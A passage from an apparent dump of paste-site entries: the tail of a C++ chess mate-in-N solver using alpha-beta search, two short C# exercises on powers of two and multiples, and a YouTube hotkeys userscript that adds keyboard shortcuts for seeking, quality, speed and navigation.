                        newBoards.push_back(newBoard);
                    }
                }
            }
        } else {
            vector<vector<bool>> attacked = attackedCells(newColor);
            if (blackCastling & 1) {
                bool invalid = false;
                for (int col = 6; col <= 7; ++col) {
                    if (b[8][col] != 0) {
                        invalid = true;
                        break;
                    }
                }
                for (int col = 5; col <= 6; ++col) {
                    if (attacked[8][col]) {
                        invalid = true;
                        break;
                    }
                }
                if (!invalid) {
                    BoardState newBoard;
                    newBoard.pieces = pieces;
                    newBoard.activeColor = newColor;
                    newBoard.whiteCastling = 0;
                    newBoard.blackCastling = blackCastling;
                    newBoard.fullMoves = fullMoves + 1;
                    newBoard.halfMoves = halfMoves + 1;
                    newBoard.enPassant = Cell(-1, -1);
                    for (auto & piece : newBoard.pieces) {
                        if (piece.cell == Cell(8, 5)) {
                            piece.cell = Cell(8, 7);
                            break;
                        }
                    }
                    for (auto & piece : newBoard.pieces) {
                        if (piece.cell == Cell(8, 8)) {
                            piece.cell = Cell(8, 6);
                            break;
                        }
                    }
                    if (!isInCheck(activeColor)) {
                        newBoards.push_back(newBoard);
                    }
                }
            }
            if (blackCastling & 2) {
                bool invalid = false;
                for (int col = 2; col <= 4; ++col) {
                    if (b[8][col] != 0) {
                        invalid = true;
                        break;
                    }
                }
                for (int col = 3; col <= 5; ++col) {
                    if (attacked[8][col]) {
                        invalid = true;
                        break;
                    }
                }
                if (!invalid) {
                    BoardState newBoard;
                    newBoard.pieces = pieces;
                    newBoard.activeColor = newColor;
                    newBoard.whiteCastling = 0;
                    newBoard.blackCastling = blackCastling;
                    newBoard.fullMoves = fullMoves + 1;
                    newBoard.halfMoves = halfMoves + 1;
                    newBoard.enPassant = Cell(-1, -1);
                    for (auto & piece : newBoard.pieces) {
                        if (piece.cell == Cell(8, 5)) {
                            piece.cell = Cell(8, 3);
                            break;
                        }
                    }
                    for (auto & piece : newBoard.pieces) {
                        if (piece.cell == Cell(8, 1)) {
                            piece.cell = Cell(8, 4);
                            break;
                        }
                    }
                    if (!isInCheck(activeColor)) {
                        newBoards.push_back(newBoard);
                    }
                }
            }
        }
        return newBoards;
    }
};

inline BoardState parseFEN(string fen) {
    int currIndex = 0;
    BoardState board;
    for (int i = 8; i >= 1; --i) {
        int pos = 0;
        while (pos < 8) {
            if (isdigit(fen[currIndex])) {
                pos += fen[currIndex] - '0';
            } else {
                pos++;
                Piece piece = Piece(fen[currIndex], i, pos);
                board.pieces.push_back(piece);
            }
            currIndex++;
        }
        currIndex++;
    }

    board.activeColor = fen[currIndex];
    currIndex += 2;

    board.whiteCastling = board.blackCastling = 0;
    while (fen[currIndex] != ' ') {
        if (fen[currIndex] == 'K')
            board.whiteCastling += 1;
        else if (fen[currIndex] == 'Q')
            board.whiteCastling += 2;
        else if (fen[currIndex] == 'k')
            board.blackCastling += 1;
        else if (fen[currIndex] == 'q')
            board.blackCastling += 2;
        currIndex++;
    }

    currIndex++;
    if (fen[currIndex] == '-') {
        board.enPassant = Cell(-1, -1);
        currIndex += 2;
    } else {
        board.enPassant = Cell(fen[currIndex + 1] - '0', fen[currIndex] - 'a' + 1);
        currIndex += 3;
    }

    board.halfMoves = 0;
    while (fen[currIndex] != ' ') {
        board.halfMoves = board.halfMoves * 10 + fen[currIndex] - '0';
        currIndex++;
    }
    currIndex++;

    board.fullMoves = 0;
    while (currIndex < fen.size()) {
        board.fullMoves = board.fullMoves * 10 + fen[currIndex] - '0';
        currIndex++;
    }

    return board;
}

//string generateFEN(BoardState board, bool includeMoves) {
//    string fen = """";
//    char b[10][10];
//    memset(b, 0, sizeof(b));
//    for (const Piece& piece : board.pieces) {
//        char p;
//        if (piece.type == Piece::Pawn) {
//            p = 'p';
//        } else if (piece.type == Piece::Knight) {
//            p = 'n';
//        } else if (piece.type == Piece::Bishop) {
//            p = 'b';
//        } else if (piece.type == Piece::Rook) {
//            p = 'r';
//        } else if (piece.type == Piece::Queen) {
//            p = 'q';
//        } else if (piece.type == Piece::King) {
//            p = 'k';
//        }
//        if (piece.color == 'w')
//            p = toupper(p);
//        b[piece.cell.x][piece.cell.y] = p;
//    }
//
//    for (int i = 8; i >= 1; --i) {
//        int pos = 0;
//        for (int j = 1; j <= 8; ++j) {
//            if (b[i][j] == 0) {
//                pos++;
//            } else {
//                if (pos > 0) {
//                    fen += to_string(pos);
//                    pos = 0;
//                }
//                fen += b[i][j];
//            }
//        }
//        if (pos != 0)
//            fen += to_string(pos);
//        if (i == 1) {
//            fen += "" "";
//        } else {
//            fen += ""/"";
//        }
//    }
//
//    fen += board.activeColor;
//    fen += "" "";
//
//    if (board.whiteCastling == 0 && board.blackCastling == 0)
//        fen += ""-"";
//    else {
//        if (board.whiteCastling & 1) {
//            fen += ""K"";
//        }
//        if (board.whiteCastling & 2) {
//            fen += ""Q"";
//        }
//        if (board.blackCastling & 1) {
//            fen += ""k"";
//        }
//        if (board.blackCastling & 2) {
//            fen += ""q"";
//        }
//    }
//    fen += "" "";
//
//    if (board.enPassant.x == -1) {
//        fen += ""-"";
//    } else {
//        fen += ('a' + board.enPassant.y - 1);
//        fen += ('0' + board.enPassant.x);
//    }
//
//    if (includeMoves) {
//        fen += "" "";
//        fen += to_string(board.halfMoves);
//        fen += "" "";
//        fen += to_string(board.fullMoves);
//    }
//
//    return fen;
//}

struct SortedBoards {
    BoardState board;
    int value;
};

inline int computeBoardScore(const BoardState& board) {
    int score = 0;
    for (const Piece& piece : board.pieces) {
        int value = 0;
        if (piece.type == Piece::Pawn) {
            value = 1;
        } else if (piece.type == Piece::Bishop) {
            value = 3;
        } else if (piece.type == Piece::Knight) {
            value = 3;
        } else if (piece.type == Piece::Rook) {
            value = 5;
        } else if (piece.type == Piece::Queen) {
            value = 9;
        }
        if (piece.color == 'w')
            score += value;
        else
            score -= value;
    }
    return score;
}

inline constexpr bool cmp1(const SortedBoards& b1, const SortedBoards& b2) {
    return b1.value > b2.value;
}

inline constexpr bool cmp2(const SortedBoards& b1, const SortedBoards& b2) {
    return b1.value < b2.value;
}

inline int alphaBetaMiniMax(BoardState& board, int depth, int alpha, int beta) {
    if (depth >= 7)
        return 0;
    if (board.isDraw())
        return 0;
    if (board.isCheckMate()) {
        if (board.activeColor == 'w') {
            return -maxv + depth;
        } else {
            return maxv - depth;
        }
    }
    vector<BoardState> generatedBoards = board.generateAllMoves();
    vector<SortedBoards> sortedBoards(generatedBoards.size());
    for (int i = 0; i < generatedBoards.size(); ++i) {
        swap(sortedBoards[i].board, generatedBoards[i]);
        sortedBoards[i].value = computeBoardScore(sortedBoards[i].board);
    }
    if (board.activeColor == 'w') {
        int maxEval = -inf;
        sort(sortedBoards.begin(), sortedBoards.end(), cmp1);
        for (auto newBoard : sortedBoards) {
            int eval = alphaBetaMiniMax(newBoard.board, depth + 1, alpha, beta);
            maxEval = max(maxEval, eval);
            alpha = max(alpha, eval);
            if (beta <= alpha)
                break;
        }
        return maxEval;
    } else {
        int minEval = inf;
        sort(sortedBoards.begin(), sortedBoards.end(), cmp2);
        for (auto newBoard : sortedBoards) {
            int eval = alphaBetaMiniMax(newBoard.board, depth + 1, alpha, beta);
            minEval = min(minEval, eval);
            beta = min(beta, eval);
            if (beta <= alpha)
                break;
        }
        return minEval;
    }
}

int main() {
    freopen(""instances/easy/2.in"", ""r"", stdin);

    string fen;
    getline(cin, fen);
    BoardState board = parseFEN(fen);

    int answer = alphaBetaMiniMax(board, 0, -inf, inf);
    if (answer == 0) {
        cout << ""Draw"" << endl;
    } else if (answer > 0) {
        cout << ""W M"" << (-answer + maxv + 1) / 2 << endl;
    } else {
        cout << ""B M"" << (answer + maxv + 1) / 2 << endl;
    }

    return 0;
}
"
RdMZm4eQ,DegreeOfTwo,UrayFenn,C#,Saturday 17th of February 2024 03:18:58 PM CDT,"namespace DegreeOfTwo
{
    internal class Program
    {
        static void Main(string[] args)
        {
            int number = 2;
            int minNumber = 1;
            int maxNumber = 100;
            int degree = 0;
            int lastNumber = 1;
            Random random = new Random();
            int randomNumber = random.Next(minNumber, maxNumber);

            while (randomNumber >= lastNumber)
            {
                degree++;
                lastNumber *= number;
            }

            Console.WriteLine($"" - {randomNumber}\n - {degree}\n{number}   {degree} - {lastNumber}"");
        }
    }
}"
Pk2eDPWY,Multiples,UrayFenn,C#,Saturday 17th of February 2024 03:14:31 PM CDT,"namespace Multiples
{
    internal class Program
    {
        static void Main(string[] args)
        {
            int maxNumber = 25;
            int minNumber = 10;
            int minRange = 50;
            int maxRange = 150;
            int counter = 0;
            Random random = new Random();
            int number = random.Next(minNumber, maxNumber + 1);
            Console.WriteLine($"" N - {number}"");

            for (int i = 0; i < maxRange; i += number)
            {
                if (i >= minRange)
                {
                    counter++;
                }
            }

            Console.WriteLine($""    - {counter}"");
        }
    }
}"
n4KJm9v8,more-youtube-hotkeys.user.js,jcunews,JavaScript,Saturday 17th of February 2024 02:57:25 PM CDT,"// ==UserScript==
// @name         More YouTube Hotkeys
// @namespace    https://greasyfork.org/en/users/85671-jcunews
// @version      1.2.51.1
// @license      AGPLv3
// @author       jcunews
// @description  Adds more keyboard shortcuts for YouTube. The list of all new shortcuts is added into new ""More Shortcuts"" section on YouTube's ""Keyboard shortcuts"" popup which can be accessed via ""?"" or SHIFT+/ key (on U.S. keyboards).
// @match        *://www.youtube.com/*
// @grant        none
// @run-at       document-start
// ==/UserScript==

(ch => {

  //=== CONFIGURATION BEGIN
  /*
  `key` is the key name. If it's a letter, it must be in uppercase.
  `mods` is a zero or up to 3 modifier key characters (in any order): `A`=Alt, `C`=Control, `S`=Shift. Character case is ignored.
    e.g. """" (no modifier key), ""s"" (Shift), ""Cs"" (Control+Shift), ""aSc"" (Control+Shift+Alt).
  `desc` is the hotkey description which will be added onto YouTube's Hotkey List Popup (accessible via `?` or `SHIFT+/` key).
    If this property is empty or doesn't exist, the hotkey won't be included in YouTube's Hotkey List Popup.
  `keys` is an optional custom text representation for the keyboard keys which is useful to represent multiple hotkeys.
  `func` is the JavaScript function to execute with the activated hotkey object as the first argument.
  */

  var hotkeys = [
    {key: ""`"", mods: """", desc: ""Toggle guide / sidebar"", func: a => eleClick('#guide-button')},
    {key: "";"", mods: """", desc: ""Focus channel search box"", func: a => eleClick('#tabs-container :is(ytd-expandable-tab-renderer,.ytd-expandable-tab-renderer):has(form[action*=""/search""]) button.yt-icon-button')},
    {key: "")"", mods: ""S"", desc: ""Seek to specific point in the video (SHIFT+7 advances to 75% of duration)"", keys: ""SHIFT+0..SHIFT+9"", func: a => videoSeekTo(0.05)},
    {key: ""!"", mods: ""S"", func: a => videoSeekTo(0.15)},
    {key: ""@"", mods: ""S"", func: a => videoSeekTo(0.25)},
    {key: ""#"", mods: ""S"", func: a => videoSeekTo(0.35)},
    {key: ""$"", mods: ""S"", func: a => videoSeekTo(0.45)},
    {key: ""%"", mods: ""S"", func: a => videoSeekTo(0.55)},
    {key: ""^"", mods: ""S"", func: a => videoSeekTo(0.65)},
    {key: ""&"", mods: ""S"", func: a => videoSeekTo(0.75)},
    {key: ""*"", mods: ""S"", func: a => videoSeekTo(0.85)},
    {key: ""("", mods: ""S"", func: a => videoSeekTo(0.95)},
    {key: ""J"", mods: ""A"", func: a => videoSeekChapter(-1), desc: ""Seek to previous chapter""},
    {key: ""L"", mods: ""A"", func: a => videoSeekChapter(1), desc: ""Seek to next chapter""},
    {key: ""C"", mods: ""S"", desc: ""Select preferred subtitle language"", func: selectCaption},
    {key: ""J"", mods: ""S"", desc: ""Rewind video by 30 seconds"", func: a => videoSeekBy(-30)},
    {key: ""L"", mods: ""S"", desc: ""Fast forward video by 30 seconds"", func: a => videoSeekBy(30)},
    {key: ""G"", mods: ""A"", desc: ""Decrease video quality"", func: selectQuality},
    {key: ""H"", mods: ""A"", desc: ""Increase video quality"", func: selectQuality},
    {key: ""Y"", mods: ""A"", desc: ""Set video quality to auto"", func: selectQuality},
    {key: ""-"", mods: """", desc: ""Decrease video playback speed by 0.25"", func: a => adjustSpeed(-1)},
    {key: ""="", mods: """", desc: ""Increase video playback speed by 0.25"", func: a => adjustSpeed(1)},
    {key: ""E"", mods: """", desc: ""Toggle like video"", func: a => eleClick(['#segmented-like-button button', ':is(#info, #description-and-actions, #actions) #menu ytd-toggle-button-renderer:nth-of-type(1) button#button', '#info #menu #top-level-buttons-computed ytd-toggle-button-renderer:nth-of-type(1) button#button', 'like-button-view-model button'])},
    {key: ""E"", mods: ""S"", desc: ""Toggle dislike video"", func: a => eleClick(['#segmented-dislike-button button', ':is(#info, #description-and-actions, #actions) #menu ytd-toggle-button-renderer:nth-of-type(2) button#button', '#info #menu #top-level-buttons-computed ytd-toggle-button-renderer:nth-of-type(2) button#button', 'dislike-button-view-model button'])},
    {key: ""H"", mods: """", desc: ""Share video"", func: a => eleClick([':is(#info, #description-and-actions) #menu ytd-button-renderer:nth-of-type(1) button#button,ytd-watch-metadata #menu ytd-button-renderer button:has(div[style*=""share""])', 'ytd-watch-metadata #menu ytd-button-renderer button[aria-label=""Share""]'])},
    {key: ""N"", mods: """", desc: ""Download video"", func: a => eleClick(['ytd-watch-metadata #menu ytd-button-renderer button:has(div[style*=""download""])', '.ytd-download-button-renderer button'])},
    {key: ""Q"", mods: ""S"", desc: ""Toggle YouTube video controls"", func: toggleYtVideoControls},
    {key: ""V"", mods: """", desc: ""Save video into playlist"", func: a => eleClick(':is(#info, #description-and-actions) #menu ytd-button-renderer:last-of-type button#button,#actions button:has(div[style*=""list_add""])')},
    {key: ""U"", mods: """", desc: ""Toggle subscription"", func: a => eleClick('#meta ytd-subscribe-button-renderer>.ytd-subscribe-button-renderer:not(div),paper-button.ytd-subscribe-button-renderer,tp-yt-paper-button.ytd-subscribe-button-renderer,ytd-subscribe-button-renderer.ytd-watch-metadata button', true)},
    {key: ""Y"", mods: """", desc: ""Toggle subscription notification"", func: a => eleClick(['ytd-watch-flexy #meta  .ytd-subscription-notification-toggle-button-renderer>button#button', 'ytd-watch-flexy #notification-preference-toggle-button > .ytd-subscribe-button-renderer'])},
    {key: ""R"", mods: """", desc: ""Toggle replay chat or chapter list"", func: toggleChatChap},
    {key: ""R"", mods: ""S"", desc: ""Toggle sponsored video list"", func: a => eleClick('ytd-engagement-panel-section-list-renderer[target-id=""ytbc-related-shelf""] #visibility-button .yt-icon-button')},
    {key: ""X"", mods: """", desc: ""Toggle autoplay of next non-playlist video"", func: a => eleClick(['paper-toggle-button.ytd-compact-autoplay-renderer', 'button[data-tooltip-target-id=""ytp-autonav-toggle-button""]'])},
    {key: ""V"", mods: ""S"", desc: ""Go to user/channel video page"", func: a => navUser(""Videos"", ""videos"")},
    {key: ""Y"", mods: ""S"", desc: ""Go to user/channel playlists page"", func: a => navUser(""Playlists"", ""playlists"")},
    {key: ""`"", mods: ""C"", desc: ""Go to YouTube home page"", func: a => eleClick('a#logo')},
    {key: ""S"", mods: ""S"", desc: 'Go to Subscriptions page', func: a => eleClick('a[href=""/feed/subscriptions""]') || (location.href = ""/feed/subscriptions"")},
    {key: ""F"", mods: ""S"", desc: 'Go to Feeds (""You"") page', func: a => eleClick('a[href=""/feed/you""]') || (location.href = ""/feed/you"")},
    {key: ""I"", mods: ""S"", desc: ""Go to History page"", func: a => eleClick('a[href=""/feed/history""]') || (location.href = ""/feed/history"")},
    {key: ""W"", mods: ""S"", desc: ""Go to Watch Later page"", func: a => eleClick('a[href=""/playlist?list=WL""]') || (location.href = ""/playlist?list=WL"")},
    {key: ""K"", mods: ""S"", desc: ""Go to Liked Videos page"", func: a => eleClick('a[href=""/playlist?list=LL""]') || (location.href = ""/playlist?list=LL"")},
    {key: ""T"", mods: ""S"", desc: ""Go to Account page"", func: a => eleClick('a[href=""/account""]') || (location.href = ""/account"")}
  ];
  var subtitleLanguageCode = ""en""; //2-letters language code for select preferred subtitle language hotkey

  //=== CONFIGURATION END

  var baseKeys = {};
  (""~`!1@2#3$4%5^6&7*8(9)0_-+={[}]:;\""'|\\<,>.?/"").split("""").forEach((c, i, a) => {
    if ((i & 1) === 0) baseKeys[c] = a[i + 1];
  });

  function isHidden(e) {
    while (e && e.style) {
      if (getComputedStyle(e).display === ""none"") {
        return true;
      }
      e = e.parentNode
    }
    return false
  }

  function eleClick(s, l, e) {
    if (s.some) {
      s.some(a => {
        if (e = document.querySelector(a)) {
          if (e.disabled || isHidden(e)) e = null
        }
        if (e) return true
      });
    } else if (l) {
      e = Array.from(document.querySelectorAll(s)).find(f => !f.disabled && !isHidden(f))
    } else if (e = document.querySelector(s)) {
      if (e.disabled || isHidden(e)) e = null
    }
    if (e) {
      e.click();
      return true
    }
  }

  function videoSeekBy(t, v) {
    (v = document.querySelector('.html5-video-player')) && v.seekBy(t);
  }

  function videoSeekTo(p, v) {
    (v = document.querySelector('.html5-video-player')) && v.seekTo(v.getDuration() * p);
  }

  function videoSeekChapter(d, v, s, t) {
    if (
      (v = document.querySelector('.html5-video-player')) && (s = v.getPlayerResponse().videoDetails) &&
      (s = s.shortDescription)
    ) {
      t = v.getCurrentTime();
      if (s = s.match(/^(?:\s*\d+\.)?\s*(\d{1,2}:)?\d{1,2}:\d{1,2}\s+\S+.*/gm)) {
        s = s.map(s => {
          s = s.match(/^(?:\s*\d+\.)?\s*(\d{1,2}:)?(\d{1,2}):(\d{1,2})/);
          s[1] = s[1] ? parseInt(s[1]) : 0;
          s[2] = s[2] ? parseInt(s[2]) : 0;
          s[3] = s[3] ? parseInt(s[3]) : 0;
          return (s[1] * 3600) + (s[2] * 60) + s[3]
        })
      }
    }
    if (
      (!s || !s.some || !s.length) && (s = window[""page-manager""]) && (s = s.getCurrentData()) && (s = s.response) && (s = s.playerOverlays) &&
      (s = s.playerOverlayRenderer) && (s = s.decoratedPlayerBarRenderer) && (s = s.decoratedPlayerBarRenderer) && (s = s.playerBar) &&
      (s = s.multiMarkersPlayerBarRenderer) && (s = s.markersMap)
    ) {
      s.some(m => {
        if (m.key === ""AUTO_CHAPTERS"") {
          if ((m = m.value) && (m = m.chapters) && m.length && m[0] && m[0].chapterRenderer && m[0].chapterRenderer) {
            s = m.map(a => Math.floor(a.chapterRenderer.timeRangeStartMillis / 1000))
          }
          return true
        }
      })
    }
    if (s && s.some) {
      if (s.length && (s[0] > 1)) s.unshift(0);
      s.some((c, i) => {
        if ((d < 0) && (c <= t) && (!s[i + 1] || (s[i + 1] > t))) {
          if ((c + 1) >= t) {
            v.seekTo(s[i - 1]);
          } else v.seekTo(c);
          return true
        } else if ((d > 0) && (c > t) && i) {
          v.seekTo(c);
          return true
        }
      })
    }
  }

  function selectQuality(i, v, e, c) {
    if ((v = document.querySelector('.html5-video-player')) && (v.getAvailableQualityLabels().length > 1)) {
      if (i.key === ""Y"") {
        v.setPlaybackQualityRange(""auto"", ""auto"");
      } else {
        (e = v.getAvailableQualityLevels()).pop();
        c = e.indexOf(v.getPlaybackQuality());
        i = i.key === ""G"" ? 1 : -1;
        if (e = e[c + i]) v.setPlaybackQualityRange(e, e);
      }
    }
  }

  function adjustSpeed(d, s) {
    if (s = Math.floor((movie_player.getPlaybackRate() * 4) + d) / 4) movie_player.setPlaybackRate(s)
  }

  function selectCaption(v, o, c, a) {
    if (
      (v = document.querySelector('.html5-video-player')) && (o = v.getPlayerResponse().captions) &&
      (o = o.playerCaptionsTracklistRenderer) && (o = o.captionTracks)
    ) {
      if ((c = v.getOption(""captions"", ""track"")) && c.vss_id) {
        if (c.vss_id === (""."" + subtitleLanguageCode)) {
          a = o.find(ct => ct.vssId === (""a."" + subtitleLanguageCode));
          if (!a) a = o.find(ct => ct.isTranslatable && (ct.vssId[0] === ""."") && (ct.vssId.substr(1) !== subtitleLanguageCode));
          if (!a) a = o.find(ct => ct.isTranslatable && (ct.vssId[1] === ""."") && (ct.vssId.substr(2) !== subtitleLanguageCode));
        }
        if (!a && (c.vss_id === (""a."" + subtitleLanguageCode))) {
          a = o.find(ct => ct.isTranslatable && (ct.vssId[0] === ""."") && (ct.vssId.substr(1) !== subtitleLanguageCode));
          if (!a) a = o.find(ct => ct.isTranslatable && (ct.vssId[1] === ""."") && (ct.vssId.substr(2) !== subtitleLanguageCode));
        }
        if (!a && c.is_translateable && (c.vss_id[0] === ""."") && (c.vss_id.substr(1) !== subtitleLanguageCode)) {
          a = o.find(ct => ct.isTranslatable && (ct.vssId[1] === ""."") && (ct.vssId.substr(2) !== subtitleLanguageCode));
        }
      }
      if (!a) {
        a = o.find(ct => ct.vssId === (""."" + subtitleLanguageCode));
        if (!a) a = o.find(ct => ct.vssId === (""a."" + subtitleLanguageCode));
        if (!a) a = o.find(ct => ct.isTranslatable && (ct.vssId[0] === ""."") && (ct.vssId.substr(1) !== subtitleLanguageCode));
        if (!a) a = o.find(ct => ct.isTranslatable && (ct.vssId[1] === ""."") && (ct.vssId.substr(2) !== subtitleLanguageCode));
        if (!a) {
          a = o.find(ct => ct.isTranslatable && (
            ((ct.vssId[0] === ""."") && (ct.vssId.substr(1) !== subtitleLanguageCode)) ||
            ((ct.vssId[1] === ""."") && (ct.vssId.substr(2) !== subtitleLanguageCode))
          ));
        }
        if (!a) return;
      }
      a = {languageCode: a.languageCode, vss_id: a.vssId};
      if (a.languageCode !== subtitleLanguageCode) {
        v.getPlayerResponse().captions.playerCaptionsTracklistRenderer.translationLanguages.some(l => {
          if (l.languageCode === subtitleLanguageCode) {
            a.translationLanguage = {languageCode: subtitleLanguageCode};
            a.translationLanguage.languageName = l.languageName.simpleText;
            return true;
          }
        });
      }
      if (!c.languageCode) v.toggleSubtitles();
      v.setOption(""captions"", ""track"", a);
    }
  }

  function toggleChatChap(a) {
    if (!eleClick([
      '#chat-messages #close-button button',
      '#show-hide-button.ytd-live-chat-frame button',
      '#show-hide-button.ytd-live-chat-frame > ytd-toggle-button-renderer.ytd-live-chat-frame',
      'ytd-engagement-panel-section-list-renderer[target-id=""engagement-panel-macro-markers-description-chapters""][visibility=""ENGAGEMENT_PANEL_VISIBILITY_EXPANDED""] #visibility-button button',
      '.ytp-chapter-title'
    ]) && (a = document.querySelector('ytd-live-chat-frame:not([collapsed]) #chatframe'))) a.contentWindow.postMessage(""myhujs_toggleChatChap"")
  }

  function toggleYtVideoControls(v) {
    if (v = document.querySelector('.html5-video-player')) {
      if (v.classList.contains(""ytp-autohide-active"")) {
        v.classList.remove(""ytp-autohide-active"")
      } else if (v.classList.contains(""ytp-autohide"")) {
        v.classList.remove(""ytp-autohide"")
      } else v.classList.add(""ytp-autohide"")
    }
  }

  function navUser(tn, tp, a, b, d) {
    if ((new RegExp(`^/(channel|user)/[^/]+/${tp}$`)).test(location.pathname)) {
      Array.from(document.querySelectorAll('.paper-tab')).some(e => {
        if (e.textContent.trim() === tn) {
          e.parentNode.click();
          return true;
        }
      });
    } else if (
      (a = document.querySelector(':is(.ytd-video-secondary-info-renderer,ytd-watch-metadata) yt-formatted-string.ytd-channel-name')) &&
      (d = a.__data) && (d = d.text) && (d = d.runs) && (d = d[0]) && (d = d.navigationEndpoint)
    ) {
      if (b = document.querySelector("".yt-page-navigation-progress"")) {
        b.style.transform = ""scaleX(.5)"";
        b.parentNode.hidden = false
      }
      fetch(d.commandMetadata.webCommandMetadata.url, {credentials: ""omit""}).then(r => r.text().then((h, x, ep, e, t, m) => {
        if ((h = h.match(/var ytInitialData = (\{.*?\});/)) && (h = JSON.parse(h[1]).contents.twoColumnBrowseResultsRenderer.tabs)) {
          x = new RegExp(`^\\/[^\\/]+(?:\\/[^\\/]+)?\\/${tp}$`);
          if (h.some((v, i, b) => {
            if ((b = v.tabRenderer) && !b.content && x.test((b = b.endpoint).commandMetadata.webCommandMetadata.url)) {
              e = (ep = d).browseEndpoint;
              t = d.clickTrackingParams;
              m = d.commandMetadata;
              d.browseEndpoint = b.browseEndpoint;
              d.clickTrackingParams = b.clickTrackingParams;
              d.commandMetadata = b.commandMetadata;
              return true
            }
          })) {
            a.firstElementChild.click();
            setTimeout(() => {
              ep.browseEndpoint = e;
              ep.clickTrackingParams = t;
              ep.commandMetadata = m;
            }, 20)
          }
        }
      }))
    }
  }

  function checkHotkeyPopup(a, b, c, d, e) {
    if ((a = document.querySelector(""#sections.ytd-hotkey-dialog-content"")) && !a.querySelector("".more-hotkeys"")) {
      a.__shady_native_appendChild(b = (d = a.firstElementChild).__shady_native_cloneNode(false)).classList.add(""more-hotkeys"");
      a.__shady_native_appendChild(d.__shady_native_cloneNode(false));
      b.__shady_native_appendChild(d.__shady_native_firstElementChild.__shady_native_cloneNode(false)).textContent = ""More Hotkeys"";
      c = b.__shady_native_appendChild(d.__shady_native_lastElementChild.__shady_native_cloneNode(false));
      d = d.__shady_native_lastElementChild.firstElementChild;
      hotkeys.forEach((h, e, f) => {
        if (h.desc) {
          e = c.__shady_native_appendChild(d.__shady_native_cloneNode(true));
          e.__shady_native_firstElementChild.textContent = h.desc;
          if (!(f = h.keys)) {
            if (h.ctrl || h.alt) {
              f = (h.ctrl ? ""CTRL+"" : """") + (h.shift ? ""SHIFT+"" : """") + (h.alt ? ""ALT+"" : """") + h.key;
            } else if (h.shift) {
              f = h.key + "" ("" + (h.shift ? ""SHIFT+"" : """") + (h.shift ? baseKeys[h.key] || h.key.toLowerCase() : h.key) + "")"";
            } else f = h.key.toLowerCase();
          }
          e.__shady_native_lastElementChild.textContent = f;
        }
      });
    } else if (--ch) setTimeout(checkHotkeyPopup, 100);
  }

  function editable(e) {
    var r = false;
    while (e) {
      if (e.contentEditable === ""true"") return true;
      e = e.parentNode;
    }
    return r;
  }

  if (top !== self) {
    addEventListener(""message"", ev => (ev.data === ""myhujs_toggleChatChap"") && toggleChatChap())
  }

  hotkeys.forEach(h => {
    var a = h.mods.toUpperCase().split("""");
    h.shift = a.includes(""S"");
    h.ctrl = a.includes(""C"");
    h.alt = a.includes(""A"");
  });
  addEventListener(""keydown"", (ev, a) => {
    if ((a = document.activeElement) && (editable(a) || (a.tagName === ""INPUT"") || (a.tagName === ""TEXTAREA""))) return;
    if ((ev.key === ""?"") && ev.shiftKey && !ev.ctrlKey && !ev.altKey) {
      ch = 10;
      setTimeout(checkHotkeyPopup, 100);
    }
    hotkeys.forEach(h => {
      if ((ev.key.toUpperCase() === h.key) && (ev.shiftKey === h.shift) && (ev.ctrlKey === h.ctrl) && (ev.altKey === h.alt)) {
        ev.preventDefault();
        (""function"" === typeof h.func) && h.func(h);
      }
    });
  }, true);

})();
"
